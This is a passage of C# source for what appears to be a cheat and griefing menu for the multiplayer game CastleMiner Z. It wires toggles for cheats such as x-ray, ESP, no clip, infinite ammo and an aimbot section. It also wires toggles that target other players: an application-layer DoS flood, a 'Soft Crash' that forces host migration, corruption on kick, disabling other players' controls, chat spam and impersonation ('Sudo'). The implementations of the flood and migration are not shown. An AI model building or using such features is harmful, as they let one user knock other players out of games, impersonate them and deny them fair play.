            };
            Callbacks.OnPickupRangeScale = value =>
            {
                try
                {
                    if (_pickupRangeEnabled)
                        _extendedPickupRange = value;
                }
                catch { }
            };
            #endregion

            #region Corrupt On Kick

            Callbacks.OnCorruptOnKick = enabled =>
            {
                _corruptOnKickEnabled = enabled;
                SendLog($"Corrupt On Kick: {enabled}");
            };
            #endregion

            #region Free Fly Camera

            Callbacks.OnFreeFlyCamera = enabled =>
            {
                if (enabled) ImGuiXnaRenderer.Visible = false; // Close ImGui overlay.

                _freeFlyCameraEnabled = enabled;

                if (enabled)
                    SendLog($"Free Fly: {enabled} | Hotkey (config): {ModConfig.LoadOrCreateDefaults().FreeFlyToggleKey}");
                else
                    SendLog($"Free Fly: {enabled}");
            };
            #endregion

            #region No Clip

            Callbacks.OnNoClip = enabled =>
            {
                _noClipEnabled = enabled;
                try
                {
                    // Turn on fly mode for all gamemodes.
                    // Turn off for all gamemodes except creative.
                    if (enabled)
                        CastleMinerZGame.Instance.LocalPlayer.FlyMode = true;
                    else
                    {
                        if (CastleMinerZGame.Instance.GameMode != GameModeTypes.Creative)
                            CastleMinerZGame.Instance.LocalPlayer.FlyMode = false;
                    }
                }
                catch { }
                SendLog($"No Clip: {enabled}");
            };
            #endregion

            #region Hat Or Boots

            Callbacks.OnHat = enabled =>
            {
                _hatEnabled = enabled;

                if (!enabled)
                {
                    // Hat disabled, restore the original block at location for all players but ourselves.
                    if (oldWearBlockLocation != null && oldWearBlockType != null)
                        PlaceBlocksAllExcept(CastleMinerZGame.Instance.MyNetworkGamer, (IntVector3)(Vector3)oldWearBlockLocation, (BlockTypeEnum)oldWearBlockType, CastleMinerZGame.Instance.MyNetworkGamer);

                    // Reset the hat states.
                    oldWearBlockLocation = null;
                    oldWearBlockType     = null;
                }

                SendLog($"Hat: {enabled}");
            };
            Callbacks.OnBoots = enabled =>
            {
                _bootsEnabled = enabled;

                if (!enabled)
                {
                    // Boots disabled, restore the original block at location for all players but ourselves.
                    if (oldWearBlockLocation != null && oldWearBlockType != null)
                        PlaceBlocksAllExcept(CastleMinerZGame.Instance.MyNetworkGamer, (IntVector3)(Vector3)oldWearBlockLocation, (BlockTypeEnum)oldWearBlockType, CastleMinerZGame.Instance.MyNetworkGamer);

                    // Reset the hat states.
                    oldWearBlockLocation = null;
                    oldWearBlockType     = null;
                }

                SendLog($"Boots: {enabled}");
            };
            Callbacks.OnWearType = type =>
            {
                // Invalidate the block location.
                oldWearBlockLocation = Vector3.Zero;

                _wearType = type;
            };
            #endregion

            /// === [Admin & Punishments] ===

            #region Mute

            Callbacks.OnMute = enabled =>
            {
                _muteEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _muteTargetMode   = PlayerTargetMode.None;
                    _muteTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"Mute Player: {enabled}");
                else
                    SendLog($"Mute Player: {enabled}");
            };
            Callbacks.OnMuteWarnOffender = enabled =>
            {
                _muteWarnOffenderEnabled = enabled;
                SendLog($"Mute: Warn Offenders: {enabled}");
            };
            Callbacks.OnMuteShowMessage = enabled =>
            {
                _muteShowMessageEnabled = enabled;
                SendLog($"Mute: Show Offenders Message: {enabled}");
            };
            Callbacks.OnMutePlayer = (mode, networkIds) =>
            {
                try
                {
                    _muteTargetMode   = (PlayerTargetMode)mode;
                    _muteTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                } catch { }
            };
            #endregion

            #region Disable Controls

            Callbacks.OnDisableControls = enabled =>
            {
                _disableControlsEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _disableControlsTargetMode   = PlayerTargetMode.None;
                    _disableControlsTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"Disable Player Controls: {enabled}");
                else
                    SendLog($"Disable Player Controls: {enabled}");
            };
            Callbacks.OnDisableControlsPlayer = (mode, networkIds) =>
            {
                try
                {
                    _disableControlsTargetMode   = (PlayerTargetMode)mode;
                    _disableControlsTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                } catch { }
            };
            #endregion

            #region Force Respawn

            Callbacks.OnForceRespawn = enabled =>
            {
                _forceRespawnEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _forceRespawnTargetMode   = PlayerTargetMode.None;
                    _forceRespawnTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"Force Respawn: {enabled}");
                else
                    SendLog($"Force Respawn: {enabled}");
            };
            Callbacks.OnRespawnPlayer = (mode, networkIds) =>
            {
                try
                {
                    _forceRespawnTargetMode   = (PlayerTargetMode)mode;

                    // Only keep an id when we're targeting a specific player.
                    _forceRespawnTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                }
                catch { }
            };
            #endregion

            #region Rapid Items

            Callbacks.OnRapidItems = enabled =>
            {
                _rapidItemsEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _rapidItemsTargetMode   = PlayerTargetMode.None;
                    _rapidItemsTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"Rapid Items: {enabled}");
                else
                    SendLog($"Rapid Items: {enabled}");
            };
            Callbacks.OnRapidItemsPlayer = (mode, networkIds) =>
            {
                try
                {
                    _rapidItemsTargetMode   = (PlayerTargetMode)mode;
                    _rapidItemsTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                } catch { }
            };
            Callbacks.OnRapidItemsType = type =>
            {
                _rapidItemsType = type;
            };
            Callbacks.OnRapidItemsValue = value =>
            {
                _rapidItemsTimerValue = value;
            };
            #endregion

            #region Shower

            Callbacks.OnShower = enabled =>
            {
                _showerEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _showerTargetMode   = PlayerTargetMode.None;
                    _showerTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"Shower Items: {enabled}");
                else
                    SendLog($"Shower Items: {enabled}");
            };
            Callbacks.OnShowerPlayer = (mode, networkIds) =>
            {
                try
                {
                    _showerTargetMode   = (PlayerTargetMode)mode;
                    _showerTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                } catch { }
            };
            Callbacks.OnShowerType = type =>
            {
                _showerType = type;
            };
            Callbacks.OnShowerValue = value =>
            {
                _showerTimerValue = value;
            };
            #endregion

            #region Trail

            Callbacks.OnTrail = enabled =>
            {
                _trailEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _trailTargetMode   = PlayerTargetMode.None;
                    _trailTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"Torch Trail: {enabled}");
                else
                    SendLog($"Torch Trail: {enabled}");
            };
            Callbacks.OnTrailPrivate = enabled =>
            {
                _trailPrivateEnabled = enabled;

                if (enabled)
                    SendLog($"Private Torches: {enabled}");
                else
                    SendLog($"Private Torches: {enabled}");
            };
            Callbacks.OnTrailPlayer = (mode, networkIds) =>
            {
                try
                {
                    _trailTargetMode   = (PlayerTargetMode)mode;
                    _trailTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                } catch { }
            };
            Callbacks.OnTrailType = type =>
            {
                _trailType = type;
            };
            #endregion

            #region Hug

            Callbacks.OnHug = enabled =>
            {
                _hugEnabled = enabled;

                // Reset mode when un-checked.
                if (!enabled)
                {
                    _hugTargetMode  = PlayerTargetMode.None;
                    _hugTargetNetid = (byte)0;
                }

                if (enabled)
                    SendLog($"Hug: {enabled}");
                else
                    SendLog($"Hug: {enabled}");
            };
            Callbacks.OnHugPlayer = (mode, networkIds) =>
            {
                try
                {
                    _hugTargetMode  = (PlayerTargetMode)mode;
                    _hugTargetNetid = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : (byte)0;
                }
                catch { }
            };
            Callbacks.OnHugSpreadValue = value =>
            {
                _hugSpreadValue = value;
            };
            #endregion

            #region Reliable Msg App-Layer DoS Attack

            Callbacks.OnReliableFlood = enabled =>
            {
                /*
                if (enabled)
                    CMZDialogBridge.ShowInfo(
                        title:        "Reliable Msg App-Layer DoS Attack",
                        body:         "WARNING: This is a powerful DoS attack designed to boot malicious actors.\n\n" +
                                      "Use this responsibility.",
                        onOK:         () => { },
                        preferInGame: true
                    );
                */

                _reliableFloodEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _reliableFloodTargetMode   = PlayerTargetMode.None;
                    _reliableFloodTargetNetids = new byte[0];
                }

                if (enabled)
                    SendLog($"App-Layer DoS: {enabled}");
                else
                    SendLog($"App-Layer DoS: {enabled}");
            };
            Callbacks.OnReliableFloodPlayer = (mode, networkIds) =>
            {
                try
                {
                    _reliableFloodTargetMode   = (PlayerTargetMode)mode;
                    _reliableFloodTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                }
                catch { }
            };
            Callbacks.OnReliableFloodValue = value =>
            {
                _reliableFloodBurstValue = value;
            };
            #endregion

            #region Soft Crash

            byte? _origScHostId = null;
            Callbacks.OnSoftCrash = enabled =>
            {
                try
                {
                    var game = CastleMinerZGame.Instance;

                    if (enabled)
                    {
                        // Remember original host once per enable.
                        if (_origScHostId == null)
                        {
                            // Current server authority (regardless of server appointment).
                            _origScHostId = game?.TerrainServerID;
                        }

                        _origScHostId = CastleMinerZGame.Instance.TerrainServerID;
                        ForceHostMigration(byte.MaxValue);
                    }
                    else
                    {
                        // Give it back, if we know who it was and they're still here
                        if (_origScHostId.HasValue)
                            ForceHostMigration(_origScHostId.Value);
                    }
                }
                catch { }
                SendLog($"Soft Crash: {enabled}");
            };
            #endregion

            #region Spam Text

            Callbacks.OnSpamTextShow = enabled =>
            {
                // Reset mode when un-checked.
                if (!enabled)
                {
                    if (_spamTextEnabled)
                    {
                        _spamTextEnabled = false;
                        SendLog($"Spam Text: {enabled}");
                    }

                    _spamTextSudoEnabled = false;
                    _spamTextTargetMode  = PlayerTargetMode.None;
                    _spamTextTargetNetid = (byte)0;
                }
            };
            Callbacks.OnSpamTextStart = enabled =>
            {
                _spamTextEnabled = enabled;

                // Reset mode when un-checked.
                if (!enabled)
                {
                    _spamTextSudoEnabled = false;
                    _spamTextTargetMode  = PlayerTargetMode.None;
                    _spamTextTargetNetid = (byte)0;
                }

                SendLog($"Spam Text: {enabled}");
            };
            Callbacks.OnSpamTextSudo = enabled =>
            {
                _spamTextSudoEnabled = enabled;

                // Reset mode when un-checked.
                if (!enabled)
                {
                    _spamTextTargetMode  = PlayerTargetMode.None;
                    _spamTextTargetNetid = (byte)0;
                }
            };
            Callbacks.OnSpamTextSudoPlayer = (mode, networkIds) =>
            {
                try
                {
                    _spamTextTargetMode  = (PlayerTargetMode)mode;
                    _spamTextTargetNetid = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : (byte)0;
                }
                catch { }
            };
            Callbacks.OnSpamTextValue = value =>
            {
                _spamTextValue = value;
            };
            Callbacks.OnSpamTextMessage = text =>
            {
                _spamTextMessage = text ?? string.Empty;
            };
            #endregion

            #region Sudo

            Callbacks.OnSudoPlayer = enabled =>
            {
                _sudoPlayerEnabled = enabled;

                // Reset mode when un-checked.
                if (!enabled)
                {
                    _sudoPlayerTargetMode  = PlayerTargetMode.None;
                    _sudoPlayerTargetNetid = (byte)0;
                }

                SendLog($"Sudo Player: {enabled}");
            };
            Callbacks.OnSudoPlayerPlayer = (mode, networkIds) =>
            {
                try
                {
                    _sudoPlayerTargetMode  = (PlayerTargetMode)mode;
                    _sudoPlayerTargetNetid = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : (byte)0;
                }
                catch { }
            };
            Callbacks.OnSudoCustomName = text =>
            {
                _sudoNameMessage = text ?? string.Empty;
            };
            #endregion

            #region Door Spam

            Callbacks.OnDoorSpam = enabled =>
            {
                _doorSpamEnabled = enabled;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _doorSpamTargetMode   = PlayerTargetMode.None;
                    _doorSpamTargetNetids = new byte[0];
                }
                SendLog($"Door Spam: {enabled}");
            };
            Callbacks.OnDoorSpamPlayer = (mode, networkIds) =>
            {
                try
                {
                    _doorSpamTargetMode   = (PlayerTargetMode)mode;
                    _doorSpamTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };
                }
                catch { }
            };
            #endregion

            /// === [Ghost Mode] ===

            #region Ghost Mode

            Callbacks.OnGhostMode = enabled =>
            {
                if (enabled)
                {
                    // Backup current name.
                    _ghostModeNameBackup = Gamer.SignedInGamers[PlayerIndex.One]?.Gamertag ?? string.Empty;

                    // Hide name if still checked.
                    if (_ghostModeHideNameEnabled)
                    {
                        // Change name.
                        string name = new string('\n', GenerateRandomNumberInclusive(40, 120));
                        try { CastleMinerZGame.Instance.MyNetworkGamer.Gamertag = name; } catch (Exception) { }
                        try { Gamer.SignedInGamers[PlayerIndex.One].Gamertag = name;    } catch (Exception) { }
                    }
                }
                if (!enabled && Gamer.SignedInGamers[PlayerIndex.One]?.Gamertag != _ghostModeNameBackup)
                {
                    // Restore name.
                    string name = _ghostModeNameBackup;
                    try { CastleMinerZGame.Instance.MyNetworkGamer.Gamertag = name; } catch (Exception) { }
                    try { Gamer.SignedInGamers[PlayerIndex.One].Gamertag    = name; } catch (Exception) { }
                }
                if (!enabled)
                {
                    // If within an online match, and ghostmode was disabled, ensure we revel ourselves to all network gamers.
                    // Failing todo so will cause inventory storing to crash host.
                    try
                    {
                        foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers)
                            if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)
                                PlayerExistsPrivate(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer, true);
                    }
                    catch { }
                }

                // Set LAST.
                _ghostModeEnabled = enabled;

                SendLog($"Ghost Mode: {enabled}");
            };
            Callbacks.OnGhostModeHideName = enabled =>
            {
                _ghostModeHideNameEnabled = enabled;

                // Change name.
                string name = new string('\n', GenerateRandomNumberInclusive(40, 120));
                try { CastleMinerZGame.Instance.MyNetworkGamer.Gamertag = name; } catch (Exception) { }
                try { Gamer.SignedInGamers[PlayerIndex.One].Gamertag    = name; } catch (Exception) { }

                if (!enabled && Gamer.SignedInGamers[PlayerIndex.One]?.Gamertag != _ghostModeNameBackup)
                {
                    // Restore name.
                    name = _ghostModeNameBackup;
                    try { CastleMinerZGame.Instance.MyNetworkGamer.Gamertag = name; } catch (Exception) { }
                    try { Gamer.SignedInGamers[PlayerIndex.One].Gamertag    = name; } catch (Exception) { }
                }

                SendLog($"Ghost Mode - Hide Name: {enabled}");
            };
            #endregion

            /// === [World & Visuals] ===

            #region No Enemies

            Callbacks.OnNoEnemies = enabled =>
            {
                _noEnemiesEnabled = enabled;
                SendLog($"No Enemies: {enabled}");
            };
            #endregion

            #region No Target

            Callbacks.OnNoTarget = enabled =>
            {
                _noTargetEnabled = enabled;
                SendLog($"No Enemies: {enabled}");
            };
            #endregion

            #region Xray

            Callbacks.OnXray = enabled =>
            {
                _xrayEnabled = enabled;
                GamePatches.XRayRuntime.SetEnabled(enabled);
                SendLog($"Xray: {enabled}");
            };
            #endregion

            #region Full Bright

            Callbacks.OnFullBright = enabled =>
            {
                _fullBrightEnabled = enabled;
                try
                {
                    // Toggle the _useFullBrightTiles bool.
                    GamePatches.FullBrightRuntime.SetEnabled(enabled);
                }
                catch { }
                SendLog($"Full Bright: {enabled}");
            };
            #endregion

            #region Tracers

            Callbacks.OnTracers = enabled =>
            {
                _tracersEnabled = enabled;
                SendLog($"Player Tracers: {enabled}");
            };
            #endregion

            #region Hitboxes

            Callbacks.OnHitboxes = enabled =>
            {
                _hitboxesEnabled = enabled;
                SendLog($"Player Hitboxes: {enabled}");
            };
            #endregion

            #region Hitboxes

            Callbacks.OnNametags = enabled =>
            {
                _nametagsEnabled = enabled;
                SendLog($"Player Nametags: {enabled}");
            };
            #endregion

            #region ESP Color

            Callbacks.OnESPColor = color =>
            {
                _espColor = color;
            };
            #endregion

            #region Multi Color Ammo

            Callbacks.OnMultiColorAmmo = enabled =>
            {
                _multiColorAmmoEnabled = enabled;
                SendLog($"Multi-Color Ammo: {enabled}");
            };
            #endregion

            #region Multi Color RNG

            Callbacks.OnMultiColorRNG = enabled =>
            {
                _multiColorRNGEnabled = enabled;
                SendLog($"Multi-Color Mode: {(enabled ? "RNG" : "Cycle")}");
            };
            #endregion

            #region Shoot Blocks

            Callbacks.OnShootBlocks = enabled =>
            {
                _shootBlocksEnabled = enabled;
                SendLog($"Shoot-Blocks: {enabled}");
            };
            Callbacks.OnShootBlockScope = value =>
            {
                _shootBlockScope = (PlayerSelectScope)value;
                SendLog($"Shoot-Blocks Mode: {value}");
            };
            #endregion

            #region Shoot Grenades

            Callbacks.OnShootGrenades = enabled =>
            {
                _shootGrenadeAmmoEnabled = enabled;
                SendLog($"Shoot-Grenades: {enabled}");
            };
            Callbacks.OnShootAmmoScope = value =>
            {
                _shootAmmoScope = (PlayerSelectScope)value;
                SendLog($"Shoot-Grenades Mode: {value}");
            };
            #endregion

            #region Shoot Rockets

            Callbacks.OnShootRockets = enabled =>
            {
                _shootRocketAmmoEnabled = enabled;
                SendLog($"Shoot-Rockets: {enabled}");
            };
            Callbacks.OnShootAmmoScope = value =>
            {
                _shootAmmoScope = (PlayerSelectScope)value;
                SendLog($"Shoot-Rockets Mode: {value}");
            };
            #endregion

            #region Freeze Lasers

            Callbacks.OnFreezeLasers = enabled =>
            {
                _freezeLasersEnabled = enabled;
                SendLog($"Freeze Lasers: {enabled}");
            };
            #endregion

            #region Extend Laser Time

            Callbacks.OnExtendLaserTime = enabled =>
            {
                _extendLaserTimeEnabled = enabled;
                SendLog($"Extend Laser Time: {enabled}");
            };
            #endregion

            #region Infi Laser Path

            Callbacks.OnInfiLaserPath = enabled =>
            {
                _infiLaserPathEnabled = enabled;
                SendLog($"Infi Laser Path: {enabled}");
            };
            #endregion

            #region Infi Laser Bounce

            Callbacks.OnInfiLaserBounce = enabled =>
            {
                _infiLaserBounceEnabled = enabled;
                SendLog($"Infi Laser Bounce: {enabled}");
            };
            #endregion

            #region Explosive Lasers

            Callbacks.OnExplosiveLasers = enabled =>
            {
                _explosiveLasersEnabled = enabled;
                SendLog($"Explosive-Lasers: {enabled}");
            };
            Callbacks.OnExplosiveLasersScope = value =>
            {
                _explosiveLasersScope = (PlayerSelectScope)value;
                SendLog($"Explosive-Lasers Mode: {value}");
            };
            #endregion

            #region Ride Dragon

            Callbacks.OnRideDragon = enabled =>
            {
                _rideDragonEnabled = enabled;
                SendLog($"Ride Dragon: {enabled}");
            };
            #endregion

            #region Gravity

            Vector3 _originalGravity = Vector3.Zero;
            Callbacks.OnGravity = enabled =>
            {
                try
                {
                    if (enabled)
                    {
                        // Backup the original value.
                        _originalGravity = BasicPhysics.Gravity;

                        // Set the new gravity.
                        BasicPhysics.Gravity = new Vector3(BasicPhysics.Gravity.X, _gravityValue, BasicPhysics.Gravity.Z);
                    }
                    else
                    {
                        // Restore original gravity.
                        BasicPhysics.Gravity = _originalGravity;
                    }
                } catch { }
                SendLog($"Custom Gravity: {enabled}");
            };
            Callbacks.OnGravityValue = value =>
            {
                try
                {
                    // Update the gravity value.
                    _gravityValue = value;

                    // Set the new gravity.
                    BasicPhysics.Gravity = new Vector3(BasicPhysics.Gravity.X, _gravityValue, BasicPhysics.Gravity.Z);
                } catch { }
            };
            #endregion

            #region Camera XYZ

            Vector3 _originalEyePivotOffset = Vector3.Zero;
            Callbacks.OnCamera = enabled =>
            {
                try
                {
                    AccessTools.FieldRef<FPSRig, Entity> PitchPivot = AccessTools.FieldRefAccess<FPSRig, Entity>("pitchPiviot");
                    var pivot = PitchPivot(CastleMinerZGame.Instance?.LocalPlayer);

                    if (enabled)
                    {
                        // Backup the original value.
                        _originalEyePivotOffset = pivot?.LocalPosition ?? Vector3.Zero;

                        // Set the new camera value.
                        SetEyePivotOffset();
                    }
                    else
                    {
                        // Restore original value.
                        pivot.LocalPosition = _originalEyePivotOffset;
                    }
                } catch { }
                SendLog($"Custom Camera XYZ: {enabled}");
            };
            Callbacks.OnCameraXValue = value =>
            {
                try
                {
                    // Set the X offset.
                    _cameraXValue = value;

                    // Update the camera position.
                    SetEyePivotOffset();
                } catch { }
            };
            Callbacks.OnCameraYValue = value =>
            {
                try
                {
                    // Set the Y offset.
                    _cameraYValue = value;

                    // Update the camera position.
                    SetEyePivotOffset();
                } catch { }
            };
            Callbacks.OnCameraZValue = value =>
            {
                try
                {
                    // Set the Z offset.
                    _cameraZValue = value;

                    // Update the camera position.
                    SetEyePivotOffset();
                } catch { }
            };

            void SetEyePivotOffset()
            {
                AccessTools.FieldRef<FPSRig, Entity> PitchPivot = AccessTools.FieldRefAccess<FPSRig, Entity>("pitchPiviot");
                var pivot = PitchPivot(CastleMinerZGame.Instance?.LocalPlayer);
                pivot.LocalPosition = new Vector3(_originalEyePivotOffset.X + _cameraXValue,
                                                  _originalEyePivotOffset.Y + _cameraYValue,
                                                  _originalEyePivotOffset.Z + _cameraZValue);
            }
            #endregion

            #region Item Vortex

            Callbacks.OnItemVortex = enabled =>
            {
                _itemVortexEnabled  = enabled;
                _itemVortexLocation = CastleMinerZGame.Instance?.LocalPlayer.LocalPosition ?? Vector3.Zero;

                // Reset mode & ids when un-checked.
                if (!enabled)
                {
                    _itemVortexTargetMode   = PlayerTargetMode.None;
                    _itemVortexTargetNetids = new byte[0];
                    _itemVortexLocation     = Vector3.Zero;
                    _itemVortexTargetsUs    = false;
                }

                SendLog($"Item Vortex: {enabled}");
            };
            Callbacks.OnItemVortexPlayer = (mode, networkIds) =>
            {
                try
                {
                    _itemVortexTargetMode   = (PlayerTargetMode)mode;
                    _itemVortexTargetNetids = ((PlayerTargetMode)mode == PlayerTargetMode.Player) ? networkIds : new byte[] { 0 };

                    if (_itemVortexTargetMode == PlayerTargetMode.Player)
                        _itemVortexTargetsUs = true;
                    else if (_itemVortexTargetMode == PlayerTargetMode.Player &&
                        IdMatchUtils.ContainsId(_itemVortexTargetNetids, CastleMinerZGame.Instance?.MyNetworkGamer?.Id ?? 0))
                        _itemVortexTargetsUs = true;
                    else
                        _itemVortexTargetsUs = false;
                }
                catch { }
            };
            Callbacks.OnBeaconMode = enabled =>
            {
                _beaconModeEnabled = enabled;
                SendLog($"Item Vortex Beacon Mode: {enabled}");
            };
            Callbacks.OnItemVortexType = type =>
            {
                _itemVortexType = type;
            };
            Callbacks.OnBeaconHeightValue = value =>
            {
                _beaconHeightValue = value;
            };
            Callbacks.OnItemVortexValue = value =>
            {
                _itemVortexTimerValue = value;
            };
            #endregion

            #region DE Dragon Counter

            Callbacks.OnDragonCounter = enabled =>
            {
                _dragonCounterEnabled = enabled;
                SendLog($"Dragon Counter: {enabled}");
            };
            #endregion

            #region Lava Visuals

            Callbacks.OnNoLavaVisuals = enabled =>
            {
                _noLavaVisualsEnabled = enabled;
                SendLog($"Lava Visuals: {enabled}");
            };
            #endregion

            #region Block ESP

            Callbacks.OnBlockEsp = enabled =>
            {
                _blockEspEnabled = enabled;
                try { BlockEspRenderer.Invalidate(); } catch { }
                SendLog($"Block ESP: {enabled}");
            };
            Callbacks.OnBlockEspTypes = types =>
            {
                _blockEspTypes.Clear();

                if (types != null)
                {
                    for (int i = 0; i < types.Length; i++)
                        _blockEspTypes.Add(types[i]);
                }

                try { BlockEspRenderer.Invalidate(); } catch { }

                SendLog($"Block ESP Types: {_blockEspTypes.Count}");
            };
            Callbacks.OnBlockEspChunkRadValue = value =>
            {
                _blockEspChunkRadValue = value;
                try { BlockEspRenderer.Invalidate(); } catch { }
            };
            Callbacks.OnBlockEspMaxBoxesValue = value =>
            {
                _blockEspMaxBoxesValue = value;
                try { BlockEspRenderer.Invalidate(); } catch { }
            };
            Callbacks.OnBlockEspHideTracers = enabled =>
            {
                _blockEspNoTraceEnabled = enabled;
                try { BlockEspRenderer.Invalidate(); } catch { }
                SendLog($"Block ESP Tracers Hidden: {enabled}");
            };
            #endregion

            #region Always Day Sky

            Callbacks.OnAlwaysDaySky = enabled =>
            {
                SkyTweaks.SetDaySkyAtNight(enabled);
                SendLog($"Always Day Sky: {enabled}");
            };
            #endregion

            #region Change Window Title

            string gameTitleText = CastleMinerZGame.Instance?.Window.Title ?? string.Empty;
            Callbacks.OnApplyTitle = () =>
            {
                ChangeGameTitle(gameTitleText);
                SendLog($"Set Game Title: {gameTitleText}");
            };
            Callbacks.OnGameTitleTextMessage = input =>
            {
                gameTitleText = input;
            };

            /// <summary>
            /// Changes the game window title text.
            /// </summary>
            void ChangeGameTitle(string text)
            {
                if (CastleMinerZGame.Instance != null)
                    CastleMinerZGame.Instance.Window.Title = text;
            }
            #endregion

            /// === [Building & Mining] ===

            #region Instant Mine

            Callbacks.OnInstantMine = enabled =>
            {
                _instantMineEnabled = enabled;
                SendLog($"Instant Mine: {enabled}");
            };
            #endregion

            #region Rapid Place

            Callbacks.OnRapidPlace = enabled =>
            {
                _rapidPlaceEnabled = enabled;
                SendLog($"Rapid Place: {enabled}");
            };
            #endregion

            #region Rapid Tools

            Callbacks.OnRapidTools = enabled =>
            {
                _rapidToolsEnabled = enabled;
                SendLog($"Rapid Tools: {enabled}");
            };
            #endregion

            #region Infinite Items

            Callbacks.OnInfiniteItems = enabled =>
            {
                _infiniteItemsEnabled = enabled;
                SendLog($"Infinite Items: {enabled}");
            };
            #endregion

            #region Infinite Durability

            Callbacks.OnInfiniteDurability = enabled =>
            {
                _infiniteDurabilityEnabled = enabled;
                SendLog($"Infinite Durability: {enabled}");
            };
            #endregion

            #region All Guns Harvest

            Callbacks.OnAllGunsHarvest = enabled =>
            {
                _allGunsHarvestEnabled = enabled;
                SendLog($"All Guns Harvest: {enabled}");
            };
            #endregion

            #region Block Nuker

            Callbacks.OnBlockNuker = enabled =>
            {
                _blockNukerEnabled = enabled;
                SendLog($"Block Nuker: {enabled}");
            };
            Callbacks.OnBlockNukerRangeValue = value =>
            {
                _blockNukerRangeValue = value;
            };
            #endregion

            /// === [World Rules] ===

            #region Game Difficulty

            Callbacks.OnDifficulty = difficulty =>
            {
                try
                {
                    var game        = CastleMinerZGame.Instance;
                    game.Difficulty = difficulty;
                    SendLog($"Game Difficulty: {difficulty}");
                }
                catch (Exception ex) { SendLog($"{ex}."); }
            };
            #endregion

            #region GameMode

            Callbacks.OnGameMode = gamemode =>
            {
                try
                {
                    var game      = CastleMinerZGame.Instance;
                    game.GameMode = gamemode;
                    SendLog($"Game-Mode: {gamemode}");
                }
                catch (Exception ex) { SendLog($"{ex}."); }
            };
            #endregion

            #region World Time

            Callbacks.OnWorldTime = enabled =>
            {
                _worldTimeState = enabled;

                try
                {
                    // Set the slider to the current games time.
                    if (enabled == TriState.On || enabled == TriState.Mixed)
                    {
                        _timeDay   = (int)CastleMinerZGame.Instance.GameScreen.Day  + 1;   // Use (int) to strip the .xx part off the float. Bump +1 for slider visuals.
                        _timeScale = CastleMinerZGame.Instance.GameScreen.TimeOfDay * 100; // Multiply by 100 to format a 0-100 representation.
                    }
                }
                catch { }
                SendLog($"World Time: {enabled}");
            };
            Callbacks.OnWorldTimeDay = value =>
            {
                if (_worldTimeState == TriState.Mixed) return;

                try
                {
                    // Build the world time format.
                    int   day           = _timeDay - 1;                // The game uses 0 for the day-1 baseline.
                    float time          = (float)(_timeScale / 100.0); // Define new time from a 0.0-1.0 range.
                    float newTimeFormat = day + time;

                    // Check if we are host.
                    if (!CastleMinerZGame.Instance.CurrentNetworkSession.IsHost)
                        TimeOfDayMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, newTimeFormat); // Send the new time globally.

                    // Always syncronize the time with our client.
                    CastleMinerZGame.Instance.GameScreen.Day = newTimeFormat;
                }
                catch { }
            };
            Callbacks.OnWorldTimeScale = value =>
            {
                if (_worldTimeState == TriState.Mixed) return;

                try
                {
                    // Build the world time format.
                    int   day           = _timeDay - 1;                // The game uses 0 for the day-1 baseline.
                    float time          = (float)(_timeScale / 100.0); // Define new time from a 0.0-1.0 range.
                    float newTimeFormat = day + time;

                    // Check if we are host.
                    if (!CastleMinerZGame.Instance.CurrentNetworkSession.IsHost)
                        TimeOfDayMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, newTimeFormat); // Send the new time globally.

                    // Always syncronize the time with our client.
                    CastleMinerZGame.Instance.GameScreen.Day = newTimeFormat;
                }
                catch { }
            };
            #endregion

            #region Exploding Ores

            Callbacks.OnExplodingOres = enabled =>
            {
                _explodingOresEnabled = enabled;
                SendLog($"Exploding Ores: {enabled}");
            };
            #endregion

            #region Discord (Clock/Dragon)

            Callbacks.OnChaosMode = enabled =>
            {
                _chaosModeEnabled = enabled;
                SendLog($"Chaos Mode: {enabled}");
            };
            Callbacks.OnChaosValue = value =>
            {
                _chaosTimerValue = value;
            };

            #region Auto Clock

            Callbacks.OnClockChaos = enabled =>
            {
                _clockDiscordEnabled = enabled;
                SendLog($"Auto Clock: {enabled}");
            };
            #endregion

            #region Auto Dragon

            Callbacks.OnDragonChaos = enabled =>
            {
                _dragonDiscordEnabled = enabled;
                SendLog($"Auto Dragon: {enabled}");
            };
            #endregion

            #endregion

            /// === [Combat & Aimbot] ===

            #region Super Gun Stats

            Callbacks.OnSuperGunStats = enabled =>
            {
                _superGunStatsEnabled = enabled;
                WeaponExtensions.SetSuperGunStats(enabled);
                SendLog($"Super Gun Stats: {enabled}");
            };
            #endregion

            #region Infinite Ammo

            Callbacks.OnInfiniteAmmo = enabled =>
            {
